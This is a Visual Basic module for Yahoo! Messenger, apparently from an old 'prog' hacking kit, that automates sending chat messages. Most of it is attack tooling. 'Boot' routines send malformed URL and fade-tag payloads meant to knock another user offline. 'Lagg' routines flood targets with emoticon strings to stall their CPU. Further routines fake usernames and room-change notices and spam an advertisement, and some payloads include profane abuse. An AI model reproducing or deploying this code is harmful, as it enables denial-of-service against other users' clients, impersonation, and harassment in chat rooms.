Attribute VB_Name = "YaHoEModule"

Public lngTPPY As Long
Public lngTPPX As Long


'OK This Is The Anti Boot Sub
'What The Anti Boot Does Is
'Gray Out The Pm or Chat Window
'So The Boot Dont Bother You
'
'Call This Sub In Your Form
'Like This
'
'    Private Sub Command1_Click()
'    Call AntiBoot
'    End Sub
'
'Then It Will WOrk When Thay Click The Button
'Named Command1
Sub AntiBoot()
Dim imclass As Long, atlefb As Long
' Finds The Window
imclass = FindWindow("imclass", vbNullString)
' Finds THe IEwindow (ect.. PM Server)
atlefb = FindWindowEx(imclass, 0&, "atl:004f0ba8", vbNullString)
' Close's The IEwindow (ect.. PM SeRVER)
Call SendMessageLong(atlefb, WM_CLOSE, 0&, 0&)
'ends
End Sub
'

'THIS SUB Sends The Time The The TOPMOST Winddow This Being CHAt Or PM
'TO USE IN A Form
'    Private Sub Command1_Click()
'    Call Scroll_time
'    End Sub
' Or YOu Could Ad It TO A Timer And Make A Lagg
Sub Scroll_time()
'Calls YahooSend And Tells It To Send THe Time
YahooSend (" " & Time)
'Calls The Pause So You Dont Send To Many And Get a Error
Pause 0.35
'ends
End Sub
'

'Makes YOur Form Dance Around
'Add IT TO Your Main Form Load And UNload For The Cool
'YaHoE Unloader
'Call It Like This
'Example
'Call FormDance ME
Sub FormDance(frm As Form)
frm.Left = 5: frm.Left = 400: frm.Left = 700: frm.Left = 1000: frm.Left = 3000: frm.Left = 5000: frm.Left = 7000: frm.Left = 9000
frm.Left = 7000: frm.Left = 5000: frm.Left = 3000: frm.Left = 1000: frm.Left = 3000: frm.Left = 5000
Pause (0.1): frm.Left = 7000: Pause (0.1): frm.Left = 9000: Pause (0.1): frm.Left = 7000: Pause (0.1): frm.Left = 5000: Pause (0.1): frm.Left = 3000: Pause (0.1): frm.Left = 1000: Pause (0.1): frm.Left = 400: Pause (0.1): frm.Left = 5: Pause (0.1): frm.Left = 400: Pause (0.1): frm.Left = 700: Pause (0.1): frm.Left = 1000
'ends
End Sub
'

'This SUb Close's The PM Or Chat Window
'Its Good To Call It After A Boot Send
'Call It Like This
'Example
'Call CloseIM
'Just Add It After The Boot Code
Sub CloseIM()
Dim imclass As Long
'finds window
   imclass = FindWindow("imclass", vbNullString)
'sends message to close the pm or chat window
   Call SendMessageLong(imclass, WM_CLOSE, 0&, 0&)
'Tells It To Stop If windows not Found
If imclass = 0 Then
   Exit Sub
End If
'ends
End Sub
'

'This Is The Send
'IT Sends The Text To The Pm or Chat And Clicks The Send Button
'Call It Like This Example
' Call YahooSend("WHat YOU Wanna Say")
Sub YahooSend(txt As String)
Dim imclass As Long
Dim Rich1   As Long
Dim Rich2   As Long
Dim Button  As Long
'finds the Pm Or chat window
       imclass = FindWindow("imclass", vbNullString)
'finds the PM Or Chat text box
       Rich1& = FindWindowEx(imclass, 1, "RICHEDIT", vbNullString)
       Rich2& = FindWindowEx(imclass, Rich1&, "RICHEDIT", vbNullString)
'sends text to the text box
       Call SendMessageByString(Rich2&, WM_SETTEXT, 1, txt$)
'finds the send button
       Button = FindWindowEx(imclass, 0&, "button", vbNullString)
       Button = FindWindowEx(imclass, Button, "button", vbNullString)
       Button = FindWindowEx(imclass, Button, "button", vbNullString)
       Button = FindWindowEx(imclass, Button, "button", vbNullString)
'executes the send button
       Call SendMessageLong(Button, WM_KEYDOWN, VK_SPACE, 0&)
       Call SendMessageLong(Button, WM_KEYUP, VK_SPACE, 0&)
'Tells It To Stop If It Cant Find The Button
If Button = 0 Then
   Exit Sub
End If
'ends
End Sub
'



'This Code will Hide the Buddy List On Yahoo! Messenger
'Call It Like This Example
'Call HideBuddyList
Sub HideBuddyList()
Dim yahoobuddymain As Long, yviewmanager As Long, friendtreeparent As Long
Dim systreeview As Long
yahoobuddymain = FindWindow("yahoobuddymain", vbNullString)
yviewmanager = FindWindowEx(yahoobuddymain, 0&, "yviewmanager", vbNullString)
friendtreeparent = FindWindowEx(yviewmanager, 0&, "friendtreeparent", vbNullString)
systreeview = FindWindowEx(friendtreeparent, 0&, "systreeview32", vbNullString)
Call ShowWindow(systreeview, SW_HIDE)
End Sub
'ends

'This Code will Show the Buddy List On Yahoo! Messenger
'it Only Needs To Be Used After You Hide IT With HideBuddyList
'Call It Like This Example
'Call ShowBuddyList
Sub ShowBuddyList()
Dim yahoobuddymain As Long, yviewmanager As Long, friendtreeparent As Long
Dim systreeview As Long
yahoobuddymain = FindWindow("yahoobuddymain", vbNullString)
yviewmanager = FindWindowEx(yahoobuddymain, 0&, "yviewmanager", vbNullString)
friendtreeparent = FindWindowEx(yviewmanager, 0&, "friendtreeparent", vbNullString)
systreeview = FindWindowEx(friendtreeparent, 0&, "systreeview32", vbNullString)
Call ShowWindow(systreeview, SW_SHOW)
End Sub
'ends

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'The Next Set Of Subs All The Way Down To Line 344 Of This Module
'Are Lags What Thay Do Is Lagg The Other Persons CPU
'THe Best Why To Use a Lagg Is to Add It To A Timer
'So You Can Have A Start And A Stop
'The Timer Should Look Like This
'        Private Sub Timer1_Timer()
'        Call lagg1
'        End Sub
'
'The Start Button Should Look Like This
'        Private Sub Command1_Click()
'        Timer1.Enabled = True
'        Timer1.interval = 1
'        End Sub
'
'The Stop Button Should Look Like this
'        Private Sub Command2_Click()
'        Timer1.Enabled = False
'        End Sub
'Call This Lagg Like This
'Call lagg1
Sub lagg1()
YahooSend (":):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):)C-B-M):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):):)Smile Lagg")
Pause (0.35)
End Sub
'Call This Lagg Like This
'Call lagg2
Sub lagg2()
YahooSend (":)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):))C-B-M:)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):)):) Smile Lagg 2 :))+")
Pause (0.35)
End Sub
'Call This Lagg Like This
'Call lagg3
Sub lagg3()
YahooSend ("**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==**==FlagLagg**==")
Pause (0.35)
End Sub
'Call This Lagg Like This
'Call lagg4
Sub lagg4()
YahooSend ("(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)(~~)")
Pause (0.35)
End Sub
'Call This Lagg Like This
'Call lagg5
Sub lagg5()
YahooSend (":o):o)>:)>:)(~~)(~~)**==**==:o):o)>:)>:)(~~)(~~)**==**==:o):o)>:)>:)(~~)(~~)**==**==:o):o)>:)>:)(~~)(~~)**==**==:o):o)>:)>:)(~~)(~~)**==**==:o):o)>:)>:)(~~)(~~)**==**==:o):o)>:)>:)(~~)(~~)**==**==:o):o)>:)>:)(~~)(~~)**==**==:o):o)>:)>:)(~~)(~~)**==**==:o):o)>:)>:)(~~)(~~)**==**==:o):o)>:)>:)(~~)(~~)**==**==:o):o)>:)>:)(~~)(~~)**==**==:o):o)>:)>:)(~~)(~~)**==**==:o):o)>:)>:)(~~)(~~)**==**==:o):o)>:)>:)(~~)(~~)**==**==:o):o)>:)>:)(~~)(~~)**==**==:o):o)>:)>:)(~~)(~~)**==**==:o):o)>:)>:)(~~)(~~)**==**==:o):o)>:)>:)(~~)(~~)**==**==:o):o)>:)>:)(~~)(~~)**==**==:o):o)>:)>:)(~~)(~~)**==**==:o):o)>:)>:)(~~)(~~)**==**==:o):o)>:)>:)(~~):)C-B-M:)**==:o):o)>:)>:)(~~)(~~)**==**==:o):o)>:)>:)(~~)(~~)**==**==:o):o)>:)>:)(~~)(~~)**==**==:o):o)>:)>:)(~~)(~~)**==**==:o):o)>:)>:)(~~)(~~)**==**==:o):o)>:)>:)")
Pause (0.35)
End Sub
'Call This Lagg Like This
'Call lagg6
Sub Lagg6()
YahooSend ("<snd=yahoo>:o)>:)<snd=yahoo>:o)>:)<snd=yahoo>:o)>:)<snd=yahoo>:o)>:)<snd=yahoo>:o)>:)<snd=yahoo>:o)>:)<snd=yahoo>:o)>:)<snd=yahoo>:o)>:)<snd=yahoo>:o)>:)<snd=yahoo>:o)>:)<snd=yahoo>:o)>:)<snd=yahoo>:o)>:)<snd=yahoo>:o)>:)<snd=yahoo>:o)>:)<snd=yahoo>:o)>:)<snd=yahoo>:o)>:)<snd=yahoo>:o)>:)<snd=yahoo>:o)>:)<snd=yahoo>:o)>:)<snd=yahoo>:o)>:)<snd=yahoo>:o)>:)<snd=yahoo>:o)>:)<snd=yahoo>:o)>:)<snd=yahoo>:o)>:)<snd=yahoo>:o)>:)<snd=yahoo>:o)>:)<snd=yahoo>:o)>:)<snd=yahoo>:o)>:)<snd=yahoo>:o)>:)<snd=yahoo>:o)>:)<snd=yahoo>:o)>:)<snd=yahoo>:o)>:)<snd=yahoo>:o)>:)<snd=yahoo>:o)>:)<snd=yahoo>:o)>:)<snd=yahoo>:o)>:)<snd=yahoo>:o)>:)<snd=yahoo>:o)>:)<snd=yahoo>:o)>:)<snd=yahoo>:o)>:)<snd=yahoo>:o)>:)<snd=yahoo>:o)>:)<snd=yahoo>:o)>:)<snd=yahoo>:o)>:)<snd=yahoo>:o)>:)<snd=yahoo>:o)>:)<snd=yahoo>:o)>:)")
Pause (0.35)
End Sub
'Call This Lagg Like This
'Call lagg7
Sub lagg7()
YahooSend ("ClEaR ThiS FuCkIng WinDoW Freedom RulEs **==ClEaR ThiS FuCkIng WinDoW Freedom RulEs **==ClEaR ThiS FuCkIng WinDoW Freedom RulEs **==ClEaR ThiS FuCkIng WinDoW Freedom RulEs **==ClEaR ThiS FuCkIng WinDoW Freedom RulEs **==ClEaR ThiS FuCkIng WinDoW Freedom RulEs **==ClEaR ThiS FuCkIng WinDoW Freedom RulEs **==ClEaR ThiS FuCkIng WinDoW Freedom RulEs **==ClEaR ThiS FuCkIng WinDoW Freedom RulEs **==ClEaR ThiS FuCkIng WinDoW Freedom RulEs **==ClEaR ThiS FuCkIng WinDoW Freedom RulEs **==ClEaR ThiS FuCkIng WinDoW Freedom RulEs **==ClEaR ThiS FuCkIng WinDoW Freedom RulEs **==ClEaR ThiS FuCkIng WinDoW Freedom RulEs **==ClEaR ThiS FuCkIng WinDoW Freedom RulEs **==ClEaR ThiS FuCkIng WinDoW Freedom RulEs **==ClEaR ThiS FuCkIng WinDoW Freedom RulEs **==ClEaR ThiS FuCkIng WinDoW Freedom RulEs **==**==**==")
Pause (0.35)
End Sub
'Call This Lagg Like This
'Call lagg8
Sub lagg8()
YahooSend ("<B><RED><SND=Yahoo>:):(:):-/>:):((;):D:):(:):-/>:):((;):D:):(:):-/>:):((;):D:):(:):-/>:):):(:):-/>:):((;):D:):(:):-/>:):((;):D:):(:):-/>:):((;):D:):(:):-/>:):):(:):-/>:):((;):D:):(:):-/>:):((;):D:):(:):-/>:):((;):D:):(:):-/>:):):(:):-/>:):((;):D:):(:):-/>:):((;):D:):(:):-/>:):((;):D:):(:):-/>:):):(:):-/>:):((;):D:):(:):-/>:):((;):D:):(:):-/>:):((;):D:):(:):-/>:):):(:):-/>:):((;):D:):(:):-/>:):((;):D:):(:):-/>:):((;):D:):(:):-/>:):):(:):-/>:):((;):D:):(:):-/>:):((;):D:):(:):-/>:):((;):D:):(:):-/>:):):(:):-/>:):((;):D:):(:):-/>:):((;):D:):(:):-/>:):((;):D:):(:):-/>:):):(:):-/>:):((;):D:):(:):-/>:):((;):D:):(:):-/>:):((;):D:):(:):-/>:):):(:):-/>:):((;):D:):(:):-/>:):((;):D:):(:):-/>:):((;):D:):(:):-/>:):):(:):-/>:):((;):D:):(:):-/>:):((;):D:):(:):-/>:):((;):D:):(:):-/>:):):(:):-/>:):((;):D:)")
Pause (0.35)
End Sub
'Call This Lagg Like This
'Call lagg9
Sub lagg9()
YahooSend ("X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((X-(:((")
Pause (0.35)
End Sub
'Call This Lagg Like This
'Call lagg10
Sub lagg10()
YahooSend (":):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):):D:)):)")
Pause (0.35)
End Sub
'This Is The End Of The Laggs

'This Is The Start UP Add That Sends Info To Chat Room When Prog Is Opened
'INfo Like This
'                 {}______/-=(CrÄcKz ßy Maß PreSEntS=-\______{}
'                 {}____ (Learn How to Make YOur Own Prog)___{}
'                 {}Loaded)_If You Wanna Learn To Then Go To:{}
'                 {}__-=(Get It At Http://Hacked.at/C-B-M )=-{}
'          Loaded At -> Date Time
'Call It In The Main Forms Load
'Call IT Like This
'   Call Loadtext2
Sub Loadtext2()
YahooSend "<B><font size=9><font face = " & Chr(34) & "Arial" & Chr(34) & "><snd=knock>" & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & "CrAcKz By maB RuLez BiTch We Are The BesT CrAcK HouSe On Da Net" & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & "<b><fade #0000FF,#FF0000>{}______/-=(CrÄcKz ßy Maß PreSEntS=-\______{}" & vbLf & "<b><fade #FF0000,#0000FF>{}____ (Learn How to Make YOur Own Prog)___{}" & vbLf & "<b><fade #0000FF,#FF0000>{}_(Loaded)_If You Wanna Learn To Then Go To:{}" & vbLf & "<b><fade #FF0000,#0000FF>{}_____-=(Get It At Http://Hacked.at/C-B-M )=-___{}" & vbLf & "Loaded At -> " & Now & ":)"
End Sub
'ends

'This Is The Shut DOwn Add That Sends Info To Chat Room When Prog Is Closed
'INfo Like This
'                 {}______/-=(CrÄcKz ßy Maß PreSEntS=-\______{}
'                 {}____ (Learn How to Make YOur Own Prog)___{}
'                 {}Loaded)_If You Wanna Learn To Then Go To:{}
'                 {}__-=(Get It At Http://Hacked.at/C-B-M )=-{}
'Call It In The Main Forms Unload
'Call IT Like This
'   Call Unloadtext2
Sub Unloadtext2()
YahooSend ("<B><font size=9><font face = " & Chr(34) & "Arial" & Chr(34) & "><snd=door>" & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & "If You Would Like Too Learn how to" & vbLf & "Make Your Own Yahoo ProGz Then GOTO http://hacked.at/c-b-m" & vbLf & vbLf & vbLf & "<b><fade #0000FF,#FF0000>{}______/-=(CrÄcKz ßy Maß PreSEntS=-\______{}" & vbLf & "<b><fade #FF0000,#0000FF>{}____ (Learn How to Make YOur Own Prog)___{}" & vbLf & "<b><fade #0000FF,#FF0000>{}_(Loaded)_If You Wanna Learn To Then Go To:{}" & vbLf & "<b><fade #FF0000,#0000FF>{}_____-=(Get It At Http://Hacked.at/C-B-M )=-___{}" & vbLf & "UnLoaded At -> " & Now & ":((")
End Sub
'ends Chr(34)

'This Is A Support
'It Looks Like This
'          {}-=( :Learn How To Make Progz )=-
'          {::}-=( :At Http://Hacked.at/C-B-M )=-
'If YOu  USe This Module Please Call This From Some Button
'Call It Like This
' Call Support
Sub Support()
YahooSend ("<b><fade #33ff66,#330066>{}-=( :Learn How To Make Progz )=-")
Pause (0.35)
YahooSend ("<b><fade #33ff66,#330066>{}-=(At Http://Hacked.at/C-B-M )=-")
End Sub
'ends

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'The Next Set Of Subs All The Way Down To Line 428 Of This Module
'Are Boots What Thay Do Is Boot The Other Person Off Yahoo
'THe Best Why To Use a Boot Is to Send It 2 or 3 times
'
'The Boot Button Should Look Like This
'        Private Sub Command1_Click()
'        Call AntiBoot
'        Call Pause 0.1
'        Call Boot
'        Call Pause 0.35
'        Call Boot
'        Call Pause 0.35
'        End Sub

'Call This Boot Like This
'Call Boot1
Sub Boot1()
'calls yahoo send fuction
YahooSend ("<url=fade #######, #######, #######, #######, #######, #000000, #C60000, #000000, #C60000, #000000, #C60000, #000000, #C60000, #000000, #C60000<fade #######, #######, #######, #######, #######, #000000, #C60000, #000000, #C60000, #000000, #C60000, #000000, #C60000, #000000, #C60000<fade #######, #######, #######, #######, #######, #000000, #C60000, #000000, #C60000, #000000, #C60000, #000000, #C60000, #000000, #C60000<fade #######, #######, #######, #######, #######, #000000, #C60000, #000000, #C60000, #000000, #C60000, #000000, #C60000, #000000, #C60000<fade #######, #######, #######, #######, #######, #000000, #C60000, #000000, #C60000, #000000, #C60000, #000000, #C60000, #000000, #C60000<fade #######, #######, #######, #######, #######, #000000, #C60000, #000000, #C60000, #000000")
End Sub
'Call This Boot Like This
'Call Boot2
Sub Boot2()
'calls yahoo send fuction
YahooSend ("<url=:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)**==:)")
End Sub
'Call This Boot Like This
'Call Boot3
Sub Boot3()
'calls yahoo send fuction
YahooSend ("<url=:)snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\<snd=/\")
End Sub
'Call This Boot Like This
'Call Boot4
Sub Boot4()
'calls yahoo send fuction
YahooSend ("<URL=FUK YOU BITCH :):)):):)):):)):):))FUK YOU BITCH :):)):):)):):)):):))FUK YOU BITCH :):)):):)):):)):):))FUK YOU BITCH :):)):):)):):)):):))FUK YOU BITCH :):)):):)):):)):):))FUK YOU BITCH :):)):):)):):)):):))FUK YOU BITCH :):)):):)):):)):):))FUK YOU BITCH :):)):):)):):)):):))FUK YOU BITCH :):)):):)):):)):):))FUK YOU BITCH :):)):):)):):)):):))FUK YOU BITCH :):)):):)):):)):):))FUK YOU BITCH :):)):):)):):)):):))FUK YOU BITCH :):)):):)):):)):):))FUK YOU BITCH :):)):):)):):)):):))FUK YOU BITCH :):)):):)):):)):):))FUK YOU BITCH :):)):):)):):)):):))FUK YOU BITCH :):)):):)):):)):):))FUK YOU BITCH :):)):):)):):)):):))FUK YOU BITCH :):)):):)):):)):):))FUK YOU BITCH :):)):):)):):)):):))FUK YOU BITCH :):)):):)):):)):):))FUK YOU BITCH :):)):):)):):)):):))FUK YOU BITCH :):)):):)):):)):):))FUK YOU BITCH")
End Sub
'End Of Boots


'This Clears The Chat Text
'Call It Like This
' Call ClearChat
Sub clearchat()
YahooSend vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf

End Sub
'end's

'This Is A Name Faker To Use
'Make A Form With 2 Text Box's And a Button
'Then
'Call It Like This
'        Private Sub Command1_Click()
'        Call NameFake(Text1.Text, TEXT2.Text)
'        Call Pause 0.35
'        End Sub
Sub NameFake(name As String, Text As String)
YahooSend ("Hello Room" & "<b>" & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & name$ & ": </B>" & Text$)
End Sub
'ends

'This Is A RoomChangeFaker  To Use It
'Make A Form With 3 Text Box's And a Button
'Then
'Call It Like This
'        Private Sub Command1_Click()
'        Call roomchange(Text1.Text, Text2.Text, Text3.Text)
'        Call Pause 0.35
'        End Sub
Sub roomchange(room As String, number As String, Catagory As String)
YahooSend ("<font size=10><font face = " & Chr(34) & "Arial" & Chr(34) & ">" & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & vbLf & "<green>You Are In<B> " & Chr(34) & room$ & ":" & number$ & Chr(34) & "</B><black> (" & Catagory$ & ")")
End Sub
'ends

'This Change's The Text Of Yahoo's Main Window  To Use It
'On The Main Forms Load Call THis
'Call It Like This
' Call Load2
Sub Load2()
Dim yahoobudlist As Long
Dim SetCaption As Long
'finds the window
yahoobudlist = FindWindow("YahooBuddyMain", vbNullString)
'changes the name of it
SetCaption = SendMessageByString(yahoobudlist, WM_SETTEXT, 0, "YOur Ass Must Be Learning")
End Sub
'ends

'Same As Above
